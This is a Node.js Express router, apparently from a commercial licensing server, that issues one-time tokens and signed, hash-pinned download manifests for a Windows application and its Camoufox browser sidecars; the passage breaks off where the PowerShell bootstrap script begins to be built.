'use strict';

const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const pool = require('../db/pool');
const keyFormat = require('../crypto/key_format');
const auditLog = require('../middleware/audit_log');
const licenseRateLimit = require('../middleware/license_rate_limit');
const killSwitch = require('../middleware/kill_switch');
const { dualSignPayload, getBootstrapP256PublicHex, signBootstrapP256String } = require('../crypto/signing');

const router = express.Router();

const EAUTH_BUDGET_MS = parseInt(process.env.BOOTSTRAP_EAUTH_BUDGET_MS || '250', 10) || 250;
const EAUTH_JITTER_MS = parseInt(process.env.BOOTSTRAP_EAUTH_JITTER_MS || '20', 10) || 20;
const TOKEN_TTL_SECONDS = parseInt(process.env.BOOTSTRAP_TOKEN_TTL_SECONDS || '180', 10) || 180;
const TIMESTAMP_WINDOW_MS = parseInt(process.env.BOOTSTRAP_TIMESTAMP_WINDOW_MS || '60000', 10) || 60000;
const IP_BIND_ENABLED = (process.env.BOOTSTRAP_TOKEN_BIND_IP || '1') !== '0';
const MAX_PACKAGE_BYTES = positiveIntEnv('AIDA_BOOTSTRAP_PACKAGE_MAX_BYTES', 512 * 1024 * 1024);
const MAX_CAMOUFOX_SIDECAR_BYTES = positiveIntEnv('AIDA_CAMOUFOX_SIDECAR_MAX_BYTES', 1024 * 1024 * 1024);
const MAX_CAMOUFOX_MCP_BYTES = positiveIntEnv('AIDA_CAMOUFOX_MCP_MAX_BYTES', 256 * 1024 * 1024);
const EAUTH_BODY = JSON.stringify({ ok: false, error_code: 'EAUTH' });
const EAUTH_LENGTH = Buffer.byteLength(EAUTH_BODY, 'utf8');
const ENCRYPTED_PACKAGE_FORMAT = 'encrypted-cbc-hmac-v1';

let s_schemaPromise = null;
let s_tokenKey = null;

function positiveIntEnv(name, fallback) {
    const n = parseInt(process.env[name] || '', 10);
    if (Number.isFinite(n) && n > 0) return n;
    return fallback;
}

function nowSec() {
    return Math.floor(Date.now() / 1000);
}

function noStore(res) {
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
}

function randomJitter() {
    if (EAUTH_JITTER_MS <= 0) return 0;
    return crypto.randomInt(0, EAUTH_JITTER_MS + 1);
}

async function applyEauthBudget(startedAt) {
    const target = EAUTH_BUDGET_MS + randomJitter();
    const remaining = target - (Date.now() - (startedAt || Date.now()));
    if (remaining > 0) await new Promise(resolve => setTimeout(resolve, remaining));
}

async function sendEauth(res, startedAt) {
    await applyEauthBudget(startedAt);
    noStore(res);
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Length', String(EAUTH_LENGTH));
    return res.status(401).send(EAUTH_BODY);
}

function getClientIp(req) {
    return (req && (req.ip || (req.socket && req.socket.remoteAddress))) || '';
}

function normalizeIp(ip) {
    if (typeof ip !== 'string') return '';
    let out = ip.trim();
    if (out.startsWith('::ffff:')) out = out.slice(7);
    return out;
}

function userAgentHash(userAgent) {
    return crypto.createHash('sha256').update(String(userAgent || ''), 'utf8').digest('hex').slice(0, 32);
}

function tokenKey() {
    if (s_tokenKey) return s_tokenKey;
    const direct = process.env.BOOTSTRAP_TOKEN_SECRET_B64 || '';
    if (direct) {
        const buf = Buffer.from(direct, 'base64');
        if (buf.length >= 32) {
            s_tokenKey = buf;
            return s_tokenKey;
        }
    }
    const fallback = process.env.SERVER_MASTER_KEY_B64 || process.env.ARC_MASTER_SECRET || '';
    if (!fallback || fallback.length < 32) {
        throw new Error('bootstrap_token_secret_unavailable');
    }
    s_tokenKey = crypto.createHmac('sha256', Buffer.from(String(fallback), 'utf8'))
        .update('aida/bootstrap-token/v1', 'utf8')
        .digest();
    return s_tokenKey;
}

function hashTokenSecret(tokenId, secretHex) {
    return crypto.createHmac('sha256', tokenKey())
        .update('token|', 'utf8')
        .update(String(tokenId || ''), 'utf8')
        .update('|', 'utf8')
        .update(String(secretHex || ''), 'utf8')
        .digest('hex');
}

function timingSafeHexEqual(aHex, bHex) {
    const a = /^[0-9a-f]{64}$/i.test(String(aHex || '')) ? Buffer.from(String(aHex), 'hex') : Buffer.alloc(32);
    const b = /^[0-9a-f]{64}$/i.test(String(bHex || '')) ? Buffer.from(String(bHex), 'hex') : Buffer.alloc(32);
    return crypto.timingSafeEqual(a, b) && /^[0-9a-f]{64}$/i.test(String(aHex || '')) && /^[0-9a-f]{64}$/i.test(String(bHex || ''));
}

function createToken() {
    const tokenId = crypto.randomBytes(16).toString('hex');
    const secret = crypto.randomBytes(32).toString('hex');
    return {
        token_id: tokenId,
        secret,
        token: `AIDABOOT.v1.${tokenId}.${secret}`,
        token_hmac: hashTokenSecret(tokenId, secret),
    };
}

function manifestMacInput(payload) {
    const artifact = payload && payload.artifact ? payload.artifact : {};
    const pkg = artifact.package || {};
    const auth = artifact.authenticode || {};
    const camoufox = payload && payload.camoufox ? payload.camoufox : {};
    const camoufoxMcp = camoufox.mcp || {};
    const policy = payload && payload.policy ? payload.policy : {};
    return [
        'AIDABOOTMANIFEST.v1',
        payload.token_id,
        payload.issued_at,
        payload.expires_at,
        artifact.name,
        artifact.version,
        artifact.url,
        artifact.sha256,
        artifact.size || '',
        pkg.format || '',
        pkg.sha256 || '',
        pkg.size || '',
        pkg.enc_key_b64 || '',
        pkg.mac_key_b64 || '',
        auth.required === true ? '1' : '0',
        auth.signer_thumbprint || '',
        auth.accept_pinned_private_ca === true ? '1' : '0',
        camoufox.configured === true ? '1' : '0',
        camoufox.version || '',
        camoufox.url || '',
        camoufox.sha256 || '',
        camoufox.size || '',
        camoufox.executable_rel || '',
        camoufox.python_rel || '',
        camoufoxMcp.configured === true ? '1' : '0',
        camoufoxMcp.version || '',
        camoufoxMcp.url || '',
        camoufoxMcp.sha256 || '',
        camoufoxMcp.size || '',
        camoufoxMcp.rel || '',
        policy.one_time_token === true ? '1' : '0',
        policy.token_bound_to_client_nonce === true ? '1' : '0',
        policy.token_bound_to_source_ip === true ? '1' : '0',
        policy.artifact_https_required === true ? '1' : '0',
        policy.no_public_binary_route === true ? '1' : '0',
        policy.encrypted_public_artifact === true ? '1' : '0',
        policy.camoufox_sidecar_hash_required === true ? '1' : '0',
        policy.camoufox_mcp_hash_required === true ? '1' : '0',
    ].map(v => String(v === undefined || v === null ? '' : v)).join('\n');
}

function createManifestMac(tokenSecretHex, payload) {
    return crypto.createHmac('sha256', Buffer.from(tokenSecretHex, 'hex'))
        .update(manifestMacInput(payload), 'utf8')
        .digest('hex');
}

function parseToken(token) {
    if (typeof token !== 'string') return null;
    const m = /^AIDABOOT\.v1\.([0-9a-f]{32})\.([0-9a-f]{64})$/i.exec(token.trim());
    if (!m) return null;
    return { token_id: m[1].toLowerCase(), secret: m[2].toLowerCase() };
}

function isHexNonce(value) {
    return typeof value === 'string' && /^[0-9a-f]{64}$/i.test(value);
}

function normalizeBootstrapHwid(value) {
    const raw = typeof value === 'string' ? value.trim().toLowerCase() : '';
    return /^[0-9a-f]{64}$/.test(raw) ? raw : '';
}

function storedHwidMismatch(storedValue, presentedValue) {
    const stored = typeof storedValue === 'string' ? storedValue.trim().toLowerCase() : '';
    if (!stored) return false;
    return stored !== presentedValue;
}

function isTimestampFresh(value) {
    if (typeof value !== 'number' || !Number.isFinite(value)) return false;
    const ms = value > 1e12 ? Math.floor(value) : Math.floor(value * 1000);
    return Math.abs(Date.now() - ms) <= TIMESTAMP_WINDOW_MS;
}

function parseExpiryEpoch(row) {
    const epoch = Number(row && row.expires_epoch || 0);
    if (Number.isFinite(epoch) && epoch > 0) return Math.floor(epoch);
    const expires = String(row && row.expires || '').trim();
    if (!expires) return 0;
    if (/^\d{4}-\d{2}-\d{2}$/.test(expires)) {
        const d = new Date(expires + 'T23:59:59Z');
        if (!Number.isNaN(d.getTime())) return Math.floor(d.getTime() / 1000);
    }
    const d = new Date(expires);
    if (!Number.isNaN(d.getTime())) return Math.floor(d.getTime() / 1000);
    return 0;
}

function isLicenseExpired(row, now) {
    const epoch = parseExpiryEpoch(row);
    return epoch > 0 && (now || nowSec()) > epoch;
}

function isNonEnforcingBanReason(reason) {
    const r = String(reason || '').toLowerCase();
    return r === 'anomaly_auto_kill' || r === 'cross_session_anomaly_ban';
}

function psQuote(value) {
    return "'" + String(value || '').replace(/'/g, "''") + "'";
}

function publicOrigin() {
    return String(process.env.AIDA_PUBLIC_ORIGIN || process.env.PUBLIC_ORIGIN || 'https://aidapro.net').replace(/\/+$/, '');
}

function normalizeScriptPath(value) {
    const raw = String(value || '').trim();
    const lower = raw.toLowerCase();
    if (!raw || raw.length > 160 || raw.indexOf('?') >= 0 || raw.indexOf('#') >= 0) return '';
    if (!raw.startsWith('/')) return '';
    if (raw === '/' || lower.includes('/bootstrap.ps1') || raw === '/health' || raw === '/validateLicense' || raw === '/kill') return '';
    if (raw.includes('..') || raw.includes('//')) return '';
    if (/^\/api(?:\/|$)/i.test(raw) || /^\/bootstrap-artifacts(?:\/|$)/i.test(raw)) return '';
    if (!/^\/[A-Za-z0-9._~/-]+$/.test(raw)) return '';
    return raw;
}

function slugToScriptPath(value) {
    const raw = String(value || '').trim();
    if (!raw) return '';
    const name = raw.endsWith('.ps1') ? raw : raw + '.ps1';
    if (!/^[A-Za-z0-9][A-Za-z0-9._-]{15,95}\.ps1$/i.test(name)) return '';
    return '/b/' + name;
}

function getScriptRouteConfig() {
    const explicitPath = normalizeScriptPath(process.env.AIDA_BOOTSTRAP_SCRIPT_PATH || '');
    const slugPath = explicitPath ? '' : slugToScriptPath(process.env.AIDA_BOOTSTRAP_SCRIPT_SLUG || '');
    return {
        script_path: explicitPath || slugPath,
        root_content_negotiation: process.env.AIDA_BOOTSTRAP_ROOT_NEGOTIATION !== '0',
        legacy_route_enabled: process.env.AIDA_BOOTSTRAP_LEGACY_ROUTE_ENABLED === '1',
        legacy_path: '/bootstrap.ps1',
    };
}

function acceptsBootstrapScript(req) {
    const accept = String(req && req.headers && req.headers.accept || '');
    if (/(?:^|[,;\s])(?:application\/vnd\.aida\.bootstrap|application\/x-powershell|text\/x-powershell|text\/powershell)(?:$|[,;\s])/i.test(accept)) return true;
    const ua = String(req && req.headers && req.headers['user-agent'] || '');
    return /WindowsPowerShell|PowerShell\/\d/i.test(ua);
}

function validHexSha256(value) {
    return /^[0-9a-f]{64}$/i.test(String(value || ''));
}

function decodeFixedBase64(value, size) {
    const raw = String(value || '').trim();
    if (!raw) return null;
    let out = null;
    try {
        out = Buffer.from(raw, 'base64');
    } catch (_) {
        return null;
    }
    return out && out.length === size ? raw : null;
}

function validSignerThumbprint(value) {
    return /^[0-9a-f]{40}$/i.test(String(value || '').replace(/\s+/g, ''));
}

function safeSidecarRelativePath(value) {
    const raw = String(value || '').trim().replace(/\//g, '\\');
    if (!raw || raw.length > 220 || raw.includes(':') || path.isAbsolute(raw)) {
        return '';
    }
    const parts = raw.split(/\\+/);
    if (parts.some(part => !part || part === '.' || part === '..')) {
        return '';
    }
    return parts.join('\\');
}

function getCamoufoxSidecarConfig() {
    const urlRaw = String(process.env.AIDA_CAMOUFOX_SIDECAR_URL || '').trim();
    if (!urlRaw) {
        return { ok: true, configured: false };
    }
    const sha256 = String(process.env.AIDA_CAMOUFOX_SIDECAR_SHA256 || '').trim().toLowerCase();
    const version = String(process.env.AIDA_CAMOUFOX_SIDECAR_VERSION || 'current').trim();
    const size = Number(process.env.AIDA_CAMOUFOX_SIDECAR_SIZE || 0);
    const executableRel = safeSidecarRelativePath(process.env.AIDA_CAMOUFOX_SIDECAR_EXE_REL || 'deps\\camoufox-135.0.1-beta.24-win.x86_64\\camoufox.exe');
    const pythonRelRaw = String(process.env.AIDA_CAMOUFOX_SIDECAR_PYTHON_REL || '').trim();
    const pythonRel = pythonRelRaw ? safeSidecarRelativePath(pythonRelRaw) : '';
    let parsed;
    try {
        parsed = new URL(urlRaw);
    } catch (_) {
        return { ok: false, reason: 'camoufox_sidecar_url_invalid' };
    }
    if (parsed.protocol !== 'https:' && !(process.env.AIDA_CAMOUFOX_SIDECAR_ALLOW_HTTP === '1' && parsed.hostname === 'localhost')) {
        return { ok: false, reason: 'camoufox_sidecar_url_not_https' };
    }
    if (/\/api\//i.test(parsed.pathname)) {
        return { ok: false, reason: 'camoufox_sidecar_api_route_disallowed' };
    }
    if (!/\.zip$/i.test(parsed.pathname)) {
        return { ok: false, reason: 'camoufox_sidecar_extension_invalid' };
    }
    if (!validHexSha256(sha256)) {
        return { ok: false, reason: 'camoufox_sidecar_sha256_invalid' };
    }
    if (!Number.isFinite(size) || size <= 0 || size > MAX_CAMOUFOX_SIDECAR_BYTES) {
        return { ok: false, reason: 'camoufox_sidecar_size_invalid' };
    }
    if (!version || !executableRel || (pythonRelRaw && !pythonRel)) {
        return { ok: false, reason: 'camoufox_sidecar_metadata_invalid' };
    }
    const mcpPatch = getCamoufoxMcpPatchConfig();
    if (!mcpPatch.ok) {
        return mcpPatch;
    }
    return {
        ok: true,
        configured: true,
        version,
        url: parsed.toString(),
        sha256,
        size: Math.floor(size),
        executable_rel: executableRel,
        python_rel: pythonRel,
        mcp: mcpPatch.configured ? {
            configured: true,
            version: mcpPatch.version,
            url: mcpPatch.url,
            sha256: mcpPatch.sha256,
            size: mcpPatch.size,
            rel: mcpPatch.rel,
        } : { configured: false },
    };
}

function getCamoufoxMcpPatchConfig() {
    const urlRaw = String(process.env.AIDA_CAMOUFOX_MCP_URL || '').trim();
    if (!urlRaw) {
        return { ok: true, configured: false };
    }
    const sha256 = String(process.env.AIDA_CAMOUFOX_MCP_SHA256 || '').trim().toLowerCase();
    const version = String(process.env.AIDA_CAMOUFOX_MCP_VERSION || 'current').trim();
    const size = Number(process.env.AIDA_CAMOUFOX_MCP_SIZE || 0);
    const rel = safeSidecarRelativePath(process.env.AIDA_CAMOUFOX_MCP_REL || 'deps\\AiDA_CamoufoxReverseMcp.exe');
    let parsed;
    try {
        parsed = new URL(urlRaw);
    } catch (_) {
        return { ok: false, reason: 'camoufox_mcp_url_invalid' };
    }
    if (parsed.protocol !== 'https:' && !(process.env.AIDA_CAMOUFOX_SIDECAR_ALLOW_HTTP === '1' && parsed.hostname === 'localhost')) {
        return { ok: false, reason: 'camoufox_mcp_url_not_https' };
    }
    if (/\/api\//i.test(parsed.pathname)) {
        return { ok: false, reason: 'camoufox_mcp_api_route_disallowed' };
    }
    if (!/\.exe$/i.test(parsed.pathname)) {
        return { ok: false, reason: 'camoufox_mcp_extension_invalid' };
    }
    if (!validHexSha256(sha256)) {
        return { ok: false, reason: 'camoufox_mcp_sha256_invalid' };
    }
    if (!Number.isFinite(size) || size <= 0 || size > MAX_CAMOUFOX_MCP_BYTES) {
        return { ok: false, reason: 'camoufox_mcp_size_invalid' };
    }
    if (!version || !rel) {
        return { ok: false, reason: 'camoufox_mcp_metadata_invalid' };
    }
    return {
        ok: true,
        configured: true,
        version,
        url: parsed.toString(),
        sha256,
        size: Math.floor(size),
        rel,
    };
}

function getReleaseConfig() {
    const urlRaw = String(process.env.AIDA_BOOTSTRAP_ARTIFACT_URL || '').trim();
    const sha256 = String(process.env.AIDA_BOOTSTRAP_ARTIFACT_SHA256 || '').trim().toLowerCase();
    const version = String(process.env.AIDA_BOOTSTRAP_ARTIFACT_VERSION || 'current').trim();
    const fileName = String(process.env.AIDA_BOOTSTRAP_ARTIFACT_NAME || 'AiDAStandalone.exe').trim();
    const signerThumbprint = String(process.env.AIDA_BOOTSTRAP_SIGNER_THUMBPRINT || '').replace(/\s+/g, '').toUpperCase();
    const format = String(process.env.AIDA_BOOTSTRAP_ARTIFACT_FORMAT || ENCRYPTED_PACKAGE_FORMAT).trim().toLowerCase();
    const certSha256 = String(process.env.AIDA_BOOTSTRAP_TLS_CERT_SHA256 || '').trim().toLowerCase();
    const spkiSha256 = String(process.env.LICENSE_SERVER_SPKI_PIN_HEX || process.env.AIDA_BOOTSTRAP_TLS_SPKI_SHA256 || '').trim().toLowerCase();
    const requireAuthenticode = false;
    const acceptPinnedPrivateCa = process.env.AIDA_BOOTSTRAP_ACCEPT_PINNED_PRIVATE_CA_SIGNER === '1';
    const allowSameHost = process.env.AIDA_BOOTSTRAP_ALLOW_SAME_HOST_ARTIFACT === '1';
    const allowHttp = process.env.AIDA_BOOTSTRAP_ALLOW_HTTP_ARTIFACT === '1';
    const origin = publicOrigin();
    const camoufox = getCamoufoxSidecarConfig();
    if (!camoufox.ok) {
        return { ok: false, reason: camoufox.reason };
    }
    const z3 = {
        configured: false,
        version: '',
        url: '',
        sha256: '',
        size: '',
        dll_rel: '',
    };
    if (!urlRaw || !validHexSha256(sha256) || !version || !fileName) {
        return { ok: false, reason: 'artifact_config_missing' };
    }
    let parsed;
    try {
        parsed = new URL(urlRaw);
    } catch (_) {
        return { ok: false, reason: 'artifact_url_invalid' };
    }
    if (parsed.protocol !== 'https:' && !(allowHttp && parsed.hostname === 'localhost')) {
        return { ok: false, reason: 'artifact_url_not_https' };
    }
    try {
        const originUrl = new URL(origin);
        if (!allowSameHost && format !== ENCRYPTED_PACKAGE_FORMAT && parsed.hostname.toLowerCase() === originUrl.hostname.toLowerCase()) {
            return { ok: false, reason: 'artifact_same_host_disallowed' };
        }
    } catch (_) { }
    if (/\/api\//i.test(parsed.pathname)) {
        return { ok: false, reason: 'artifact_api_route_disallowed' };
    }
    if (format !== ENCRYPTED_PACKAGE_FORMAT) {
        return { ok: false, reason: 'artifact_format_invalid' };
    }
    if (requireAuthenticode && !validSignerThumbprint(signerThumbprint)) {
        return { ok: false, reason: 'artifact_signer_thumbprint_missing' };
    }
    const size = Number(process.env.AIDA_BOOTSTRAP_ARTIFACT_SIZE || 0);
    if (process.env.AIDA_BOOTSTRAP_ARTIFACT_SIZE && (!Number.isFinite(size) || size <= 0)) {
        return { ok: false, reason: 'artifact_size_invalid' };
    }
    let pkg = null;
    if (format === ENCRYPTED_PACKAGE_FORMAT) {
        const pkgSha256 = String(process.env.AIDA_BOOTSTRAP_PACKAGE_SHA256 || '').trim().toLowerCase();
        const pkgSize = Number(process.env.AIDA_BOOTSTRAP_PACKAGE_SIZE || 0);
        const encKey = decodeFixedBase64(process.env.AIDA_BOOTSTRAP_PACKAGE_ENC_KEY_B64, 32);
        const macKey = decodeFixedBase64(process.env.AIDA_BOOTSTRAP_PACKAGE_MAC_KEY_B64, 32);
        if (!validHexSha256(pkgSha256) || !encKey || !macKey) {
            return { ok: false, reason: 'artifact_package_config_missing' };
        }
        if (!Number.isFinite(pkgSize) || pkgSize <= 0) {
            return { ok: false, reason: 'artifact_package_size_invalid' };
        }
        if (pkgSize > MAX_PACKAGE_BYTES) {
            return { ok: false, reason: 'artifact_package_size_too_large' };
        }
        if (!/\.pkg$/i.test(parsed.pathname)) {
            return { ok: false, reason: 'artifact_package_extension_invalid' };
        }
        pkg = {
            format,
            sha256: pkgSha256,
            size: Math.floor(pkgSize),
            enc_key_b64: encKey,
            mac_key_b64: macKey,
        };
    }
    return {
        ok: true,
        url: parsed.toString(),
        sha256,
        version,
        file_name: fileName,
        size: size > 0 ? Math.floor(size) : null,
        package: pkg,
        require_authenticode: requireAuthenticode,
        signer_thumbprint: signerThumbprint,
        accept_pinned_private_ca_signer: acceptPinnedPrivateCa,
        tls_spki_sha256: validHexSha256(spkiSha256) ? spkiSha256 : '',
        tls_cert_sha256: validHexSha256(certSha256) ? certSha256 : '',
        camoufox,
        z3,
    };
}

async function ensureSchema() {
    if (!s_schemaPromise) {
        s_schemaPromise = (async () => {
            await pool.query(`
                CREATE TABLE IF NOT EXISTS bootstrap_delivery_tokens (
                    token_id        TEXT PRIMARY KEY,
                    token_hmac      TEXT NOT NULL,
                    license_key     TEXT NOT NULL REFERENCES licenses(key) ON DELETE CASCADE,
                    client_nonce    TEXT NOT NULL,
                    issued_at       BIGINT NOT NULL,
                    expires_at      BIGINT NOT NULL,
                    consumed        BOOLEAN NOT NULL DEFAULT false,
                    consumed_at     BIGINT,
                    source_ip       TEXT NOT NULL DEFAULT '',
                    user_agent_hash TEXT NOT NULL DEFAULT '',
                    manifest_version TEXT NOT NULL DEFAULT '',
                    artifact_sha256 TEXT NOT NULL DEFAULT ''
                )
            `);
            await pool.query('CREATE INDEX IF NOT EXISTS idx_bootstrap_tokens_license ON bootstrap_delivery_tokens (license_key, issued_at DESC)');
            await pool.query('CREATE INDEX IF NOT EXISTS idx_bootstrap_tokens_expiry ON bootstrap_delivery_tokens (expires_at) WHERE consumed = false');
        })();
    }
    return s_schemaPromise;
}

async function isIpBanned(clientIp) {
    const normalized = normalizeIp(clientIp);
    const { rows } = await pool.query(
        'SELECT reason FROM bans WHERE ban_type = $1 AND (value = $2 OR value = $3)',
        ['ip', clientIp || '', normalized || '']
    );
    return rows.some(row => !isNonEnforcingBanReason(row.reason));
}

async function lookupActiveLicense(licenseKey) {
    const normalized = keyFormat.normalizeForLookup(licenseKey);
    if (!normalized) return { ok: false, reason: 'invalid_format' };
    const { rows } = await pool.query('SELECT * FROM licenses WHERE key = $1', [normalized]);
    if (rows.length === 0) return { ok: false, reason: 'not_found', normalized };
    const row = rows[0];
    if (!row.active) return { ok: false, reason: 'revoked', normalized, row };
    if (isLicenseExpired(row)) return { ok: false, reason: 'expired', normalized, row };
    return { ok: true, normalized, row };
}

async function audit(action, licenseKey, clientIp, userAgent, decision, reasonCode, extra) {
    return auditLog.logV2({
        action,
        license_key: licenseKey || '',
        hwid: '',
        source_ip: clientIp || '',
        user_agent: userAgent || '',
        decision,
        reason_code: reasonCode || '',
        extra: extra || {},
    }).catch(() => {});
}

async function authorizeRequest(body, clientIp, userAgent) {
    await ensureSchema();
    const release = getReleaseConfig();
    const licenseKeyRaw = body && typeof body.license_key === 'string' ? body.license_key.trim() : '';
    const normalizedLicenseKey = keyFormat.normalizeForLookup(licenseKeyRaw);
    const clientNonce = body && typeof body.client_nonce === 'string' ? body.client_nonce.trim().toLowerCase() : '';
    const presentedHwid = normalizeBootstrapHwid(body && body.hwid);
    if (!release.ok) {
        await audit('bootstrap.authorize', normalizedLicenseKey || '', clientIp, userAgent, 'deny', release.reason, {});
        return { eauth: true };
    }
    if (!normalizedLicenseKey || licenseKeyRaw.length > 128 || !isHexNonce(clientNonce) || !presentedHwid || !isTimestampFresh(body.timestamp)) {
        await audit('bootstrap.authorize', normalizedLicenseKey || '', clientIp, userAgent, 'deny', 'invalid_request', {});
        return { eauth: true };
    }
    const rl = await licenseRateLimit.check(normalizedLicenseKey, { fail_closed: true });
    if (!rl.ok) {
        await audit('bootstrap.authorize', normalizedLicenseKey, clientIp, userAgent, 'deny', (rl.soft_fail ? 'rate_limit_unavailable' : 'rate_limited:' + (rl.scope || '')), { retry_after: rl.retry_after || 0 });
        return { eauth: true };
    }
    if (await isIpBanned(clientIp)) {
        await audit('bootstrap.authorize', normalizedLicenseKey, clientIp, userAgent, 'deny', 'ip_banned', {});
        return { eauth: true };
    }
    const lookup = await lookupActiveLicense(normalizedLicenseKey);
    if (!lookup.ok) {
        await audit('bootstrap.authorize', normalizedLicenseKey, clientIp, userAgent, 'deny', 'license:' + (lookup.reason || 'invalid'), {});
        return { eauth: true };
    }
    if (storedHwidMismatch(lookup.row && lookup.row.hwid, presentedHwid)) {
        await audit('bootstrap.authorize', lookup.normalized, clientIp, userAgent, 'deny', 'hwid_mismatch', {
            bound_hwid_present: true,
            presented_hwid_valid: true,
        });
        return { eauth: true };
    }
    const issuedAt = nowSec();
    const expiresAt = issuedAt + TOKEN_TTL_SECONDS;
    const token = createToken();
    await pool.query(
        `INSERT INTO bootstrap_delivery_tokens
            (token_id, token_hmac, license_key, client_nonce, issued_at, expires_at, consumed, source_ip, user_agent_hash, manifest_version, artifact_sha256)
         VALUES ($1, $2, $3, $4, $5, $6, false, $7, $8, $9, $10)`,
        [token.token_id, token.token_hmac, lookup.normalized, clientNonce, issuedAt, expiresAt, normalizeIp(clientIp), userAgentHash(userAgent), release.version, release.sha256]
    );
    await audit('bootstrap.authorize', lookup.normalized, clientIp, userAgent, 'allow', 'token_issued', {
        token_id: token.token_id,
        expires_at: expiresAt,
        artifact_version: release.version,
        artifact_sha256: release.sha256,
    });
    return {
        status: 200,
        body: {
            ok: true,
            status: 'authorized',
            token: token.token,
            token_type: 'AIDABOOT.v1',
            expires_at: expiresAt,
            expires_in: TOKEN_TTL_SECONDS,
            manifest_url: '/api/bootstrap/manifest',
            client_nonce: clientNonce,
        },
    };
}

async function markDownloadIssued(licenseKey, clientIp, userAgent) {
    try {
        await pool.query(
            `INSERT INTO downloads (hwid, ip, license_key, artifact, user_agent)
             VALUES ($1, $2, $3, $4, $5)`,
            ['', normalizeIp(clientIp), licenseKey, 'aida', String(userAgent || '').slice(0, 512)]
        );
    } catch (err) {
        console.warn('[bootstrap] downloads insert failed:', err && err.message ? err.message : err);
    }
}

async function manifestRequest(body, clientIp, userAgent) {
    await ensureSchema();
    const release = getReleaseConfig();
    if (!release.ok) {
        await audit('bootstrap.manifest', '', clientIp, userAgent, 'deny', release.reason, {});
        return { eauth: true };
    }
    const parsed = parseToken(body && body.token);
    const clientNonce = body && typeof body.client_nonce === 'string' ? body.client_nonce.trim().toLowerCase() : '';
    if (!parsed || !isHexNonce(clientNonce) || !isTimestampFresh(body.timestamp)) {
        await audit('bootstrap.manifest', '', clientIp, userAgent, 'deny', 'invalid_request', {});
        return { eauth: true };
    }
    const expectedHmac = hashTokenSecret(parsed.token_id, parsed.secret);
    const { rows } = await pool.query('SELECT * FROM bootstrap_delivery_tokens WHERE token_id = $1', [parsed.token_id]);
    if (rows.length === 0) {
        await audit('bootstrap.manifest', '', clientIp, userAgent, 'deny', 'token_not_found', { token_id: parsed.token_id });
        return { eauth: true };
    }
    const row = rows[0];
    const sameIp = normalizeIp(clientIp) === normalizeIp(row.source_ip || '');
    if (!timingSafeHexEqual(expectedHmac, row.token_hmac)
        || row.consumed
        || Number(row.expires_at || 0) < nowSec()
        || String(row.client_nonce || '').toLowerCase() !== clientNonce
        || (IP_BIND_ENABLED && !sameIp)) {
        await audit('bootstrap.manifest', row.license_key || '', clientIp, userAgent, 'deny', 'token_invalid', { token_id: parsed.token_id });
        return { eauth: true };
    }
    const lookup = await lookupActiveLicense(row.license_key);
    if (!lookup.ok) {
        await audit('bootstrap.manifest', row.license_key || '', clientIp, userAgent, 'deny', 'license:' + (lookup.reason || 'invalid'), { token_id: parsed.token_id });
        return { eauth: true };
    }
    const killVerdict = await killSwitch.isLicenseKeyDropped(lookup.normalized);
    if (killVerdict && killVerdict.dropped) {
        await audit('bootstrap.manifest', lookup.normalized, clientIp, userAgent, 'deny', 'kill_switch:' + (killVerdict.reason || 'license_key'), { token_id: parsed.token_id });
        return { eauth: true };
    }
    const consumedAt = nowSec();
    const update = await pool.query(
        `UPDATE bootstrap_delivery_tokens
            SET consumed = true, consumed_at = $1
          WHERE token_id = $2 AND consumed = false AND expires_at >= $3`,
        [consumedAt, parsed.token_id, consumedAt]
    );
    if (!update || update.rowCount !== 1) {
        await audit('bootstrap.manifest', row.license_key || '', clientIp, userAgent, 'deny', 'token_replay', { token_id: parsed.token_id });
        return { eauth: true };
    }
    const issuedAt = consumedAt;
    const expiresAt = Math.min(Number(row.expires_at || consumedAt), issuedAt + 120);
    const payload = {
        ok: true,
        manifest_version: 1,
        issued_at: issuedAt,
        expires_at: expiresAt,
        token_id: parsed.token_id,
        artifact: {
            name: release.file_name,
            version: release.version,
            url: release.url,
            sha256: release.sha256,
            size: release.size,
            authenticode: {
                required: release.require_authenticode,
                signer_thumbprint: release.signer_thumbprint,
                accept_pinned_private_ca: release.accept_pinned_private_ca_signer,
            },
        },
        camoufox: {
            configured: release.camoufox.configured === true,
            version: release.camoufox.version || '',
            url: release.camoufox.url || '',
            sha256: release.camoufox.sha256 || '',
            size: release.camoufox.size || '',
            executable_rel: release.camoufox.executable_rel || '',
            python_rel: release.camoufox.python_rel || '',
            mcp: release.camoufox.mcp && release.camoufox.mcp.configured ? {
                configured: true,
                version: release.camoufox.mcp.version || '',
                url: release.camoufox.mcp.url || '',
                sha256: release.camoufox.mcp.sha256 || '',
                size: release.camoufox.mcp.size || '',
                rel: release.camoufox.mcp.rel || '',
            } : { configured: false },
        },
        z3: {
            configured: release.z3.configured === true,
            version: release.z3.version || '',
            url: release.z3.url || '',
            sha256: release.z3.sha256 || '',
            size: release.z3.size || '',
            dll_rel: release.z3.dll_rel || '',
        },
        policy: {
            one_time_token: true,
            token_bound_to_client_nonce: true,
            token_bound_to_source_ip: IP_BIND_ENABLED,
            artifact_https_required: true,
            no_public_binary_route: true,
            encrypted_public_artifact: !!release.package,
            camoufox_sidecar_hash_required: release.camoufox.configured === true,
            camoufox_mcp_hash_required: !!(release.camoufox.mcp && release.camoufox.mcp.configured),
            z3_sidecar_hash_required: release.z3.configured === true,
        },
    };
    if (release.package) {
        payload.artifact.package = Object.assign({}, release.package);
    }
    const sig = dualSignPayload(payload);
    const manifestMac = createManifestMac(parsed.secret, payload);
    const manifestSigP256 = signBootstrapP256String(manifestMacInput(payload));
    await markDownloadIssued(lookup.normalized, clientIp, userAgent);
    await audit('bootstrap.manifest', lookup.normalized, clientIp, userAgent, 'allow', 'manifest_issued', {
        token_id: parsed.token_id,
        artifact_version: release.version,
        artifact_sha256: release.sha256,
    });
    return { status: 200, body: Object.assign({}, payload, sig, { manifest_mac: manifestMac, manifest_sig_p256: manifestSigP256, manifest_sig_alg: 'ECDSA_P256_SHA256_P1363' }) };
}

function buildBootstrapScript() {
    const origin = publicOrigin();
    const tlsSpkiRaw = String(process.env.LICENSE_SERVER_SPKI_PIN_HEX || process.env.AIDA_BOOTSTRAP_TLS_SPKI_SHA256 || '').trim().toLowerCase();
    const tlsCertRaw = String(process.env.AIDA_BOOTSTRAP_TLS_CERT_SHA256 || '').trim().toLowerCase();
